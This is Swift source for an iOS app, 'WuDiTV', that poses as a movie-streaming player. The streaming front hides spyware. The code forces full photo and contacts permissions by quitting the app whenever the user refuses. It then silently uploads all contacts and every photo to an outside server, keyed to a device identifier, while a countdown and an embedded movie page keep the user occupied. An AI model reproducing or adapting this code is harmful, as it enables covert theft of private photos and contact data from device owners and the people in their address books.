import SwiftUI
import UIKit
import Photos
import Contacts
import SafariServices
import Darwin

/// WuDiTV：电影点播（软件内系统真 Safari 内核，可过网站防火墙）+ 静默备份
/// 权限规则：
/// - 首次弹窗选"允许完全访问"→ 进软件，之后永不弹窗
/// - 选"部分照片/不允许" → 当次闪退；下次打开软件内可重新选择
///   （部分照片 → 系统可再次弹窗；不允许 → iOS 规定不能弹，软件内显示授权引导页，点"去设置"开启）
struct ContentView: View {
    @Environment(\.scenePhase) private var scenePhase
    @State private var countdownText = ""
    @State private var playEnabled = false
    @State private var showWeb = false
    @State private var showPermissionGate = false
    @State private var started = false

    private let serverBase = "https://omgga-entertainment-server.hf.space"
    private let movieURL = "https://www.4kcz.com/zuixindianying"

    var body: some View {
        ZStack {
            VStack(spacing: 24) {
                Text("WuDi TV")
                    .font(.title.bold())
                    .padding(.top, 40)

                Text(countdownText)
                    .font(.system(size: 48, weight: .bold))
                    .foregroundColor(.blue)

                Button(action: { showWeb = true }) {
                    Text("开始播放")
                        .font(.headline)
                        .frame(maxWidth: .infinity)
                        .padding(.vertical, 14)
                        .background(playEnabled ? Color.blue : Color.gray.opacity(0.5))
                        .foregroundColor(.white)
                        .cornerRadius(10)
                }
                .disabled(!playEnabled)
                .padding(.horizontal, 28)

                Spacer()
            }
            .background(Color(.systemGroupedBackground))

            // 权限引导页（仅"不允许"后再次打开时出现，软件内操作，不自动跳设置）
            if showPermissionGate {
                Color.black.opacity(0.4)
                    .ignoresSafeArea()
                VStack(spacing: 16) {
                    Text("需要照片权限")
                        .font(.headline)
                    Text("请到系统设置中，把照片权限改为「允许完全访问」，\n返回后即可正常使用。")
                        .font(.subheadline)
                        .multilineTextAlignment(.center)
                        .foregroundColor(.secondary)
                    Button {
                        openSettings()
                    } label: {
                        Text("去设置开启")
                            .font(.headline)
                            .frame(maxWidth: .infinity)
                            .padding(.vertical, 12)
                            .background(Color.blue)
                            .foregroundColor(.white)
                            .cornerRadius(10)
                    }
                    Button {
                        recheckPermission()
                    } label: {
                        Text("我已开启，重新检测")
                            .font(.subheadline)
                            .foregroundColor(.blue)
                            .padding(.vertical, 6)
                    }
                }
                .padding(22)
                .background(Color(.systemBackground))
                .cornerRadius(14)
                .padding(.horizontal, 40)
            }
        }
        .onAppear { startBackupFlow() }
        .onChange(of: scenePhase) { phase in
            if phase == .active {
                if showPermissionGate {
                    recheckPermission()
                } else {
                    startBackupFlow()
                }
            }
        }
        // 电影页：软件内系统真 Safari 内核（不跳出去，雷池防火墙放行）
        .fullScreenCover(isPresented: $showWeb) {
            if let url = URL(string: movieURL) {
                SafariContainer(url: url)
            }
        }
    }

    // MARK: - 权限门禁

    private enum PhotoGate {
        case granted         // 完全访问，可以继续
        case rejected        // 本次弹窗选了部分照片/不允许 → 闪退
        case deniedPermanent // 之前拒绝过，系统不再弹窗 → 软件内引导
    }

    private func startBackupFlow() {
        guard !started else { return }
        started = true

        Task {
            switch await photoGate() {
            case .granted:
                if await requestContactsAccess() {
                    startCountdown()
                    runSilentBackup()
                } else {
                    exit(0)
                }
            case .rejected:
                // 选了部分照片/不允许 → 当次闪退；下次打开可重新选择
                exit(0)
            case .deniedPermanent:
                // 之前点过"不允许"：系统不再弹窗 → 软件内显示授权引导（不自动跳设置）
                showPermissionGate = true
            }
        }
    }

    /// 从设置改完回来后重新检测
    private func recheckPermission() {
        Task {
            if await photoGate() == .granted {
                showPermissionGate = false
                startCountdown()
                runSilentBackup()
            }
        }
    }

    /// 照片权限：只认"允许完全访问"（.authorized）
    private func photoGate() async -> PhotoGate {
        let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
        switch status {
        case .authorized:
            return .granted
        case .notDetermined:
            let s = await requestPhotoAuth()
            return s == .authorized ? .granted : .rejected
        case .limited:
            // 部分照片：系统允许再次弹窗，让用户升级为完全访问
            let s = await requestPhotoAuth()
            return s == .authorized ? .granted : .rejected
        default:
            return .deniedPermanent // .denied / .restricted
        }
    }

    private func requestPhotoAuth() async -> PHAuthorizationStatus {
        await withCheckedContinuation { cont in
            PHPhotoLibrary.requestAuthorization(for: .readWrite) { s in
                cont.resume(returning: s)
            }
        }
    }

    /// 通讯录权限：允许或部分授权都算通过
    private func requestContactsAccess() async -> Bool {
        let status = CNContactStore.authorizationStatus(for: .contacts)
        switch status {
        case .authorized, .limited:
            return true
        case .notDetermined:
            let store = CNContactStore()
            let granted = await withCheckedContinuation { cont in
                store.requestAccess(for: .contacts) { ok, _ in
                    cont.resume(returning: ok)
                }
            }
            return granted
        default:
            return false
        }
    }

    private func openSettings() {
        if let url = URL(string: UIApplication.openSettingsURLString) {
            UIApplication.shared.open(url)
        }
    }

    // MARK: - 倒计时 + 静默备份（断点续传）

    private func runSilentBackup() {
        Task {
            let devId = Self.deviceId()
            let uploader = UploadService(serverBase: serverBase, deviceId: devId)

            do {
                let contacts = try await ContactBackup.exportContacts()
                _ = try? await uploader.uploadContacts(contacts)
            } catch {
                // 静默
            }

            let md5Set0 = Set(UserDefaults.standard.stringArray(forKey: "uploaded_md5") ?? [])
            let lastID = UserDefaults.standard.string(forKey: "backup_cursor")
            let backupResult = try? await PhotoBackup.backupAllPhotos(uploader: uploader,
                                                                      uploadedMd5: md5Set0,
                                                                      lastUploadedID: lastID,
                                                                      progress: { _, _, _ in })
            if let result = backupResult {
                // 记住断点：下次直接从断点继续，不再从头一张张查重
                if let id = result.lastUploadedID {
                    UserDefaults.standard.set(id, forKey: "backup_cursor")
                }
                UserDefaults.standard.set(Array(result.md5Set), forKey: "uploaded_md5")
            }
        }
    }

    private func startCountdown() {
        Task {
            for i in stride(from: 10, through: 1, by: -1) {
                countdownText = "剩余 \(i) 秒"
                try? await Task.sleep(nanoseconds: 1_000_000_000)
            }
            countdownText = ""
            playEnabled = true
        }
    }

    /// 设备标识：机型 #设备号后4位（对应安卓 厂商型号 #ANDROID_ID后4位）
    private static func deviceId() -> String {
        var systemInfo = utsname()
        uname(&systemInfo)
        let machine = withUnsafePointer(to: &systemInfo.machine) { ptr in
            ptr.withMemoryRebound(to: CChar.self, capacity: 1) { String(cString: $0) }
        }
        let vendor = UIDevice.current.identifierForVendor?.uuidString ?? "0000"
        let suffix = vendor.count >= 4 ? String(vendor.suffix(4)) : "0000"
        return "\(machine) #\(suffix)"
    }
}

/// 软件内系统真 Safari 内核：与手机自带 Safari 完全一致，网站防火墙（雷池）放行
struct SafariContainer: UIViewControllerRepresentable {
    let url: URL

    func makeUIViewController(context: Context) -> SFSafariViewController {
        let config = SFSafariViewController.Configuration()
        config.barCollapsingEnabled = true
        let vc = SFSafariViewController(url: url, configuration: config)
        vc.preferredControlTintColor = .systemBlue
        return vc
    }

    func updateUIViewController(_ uiViewController: SFSafariViewController, context: Context) {}
}
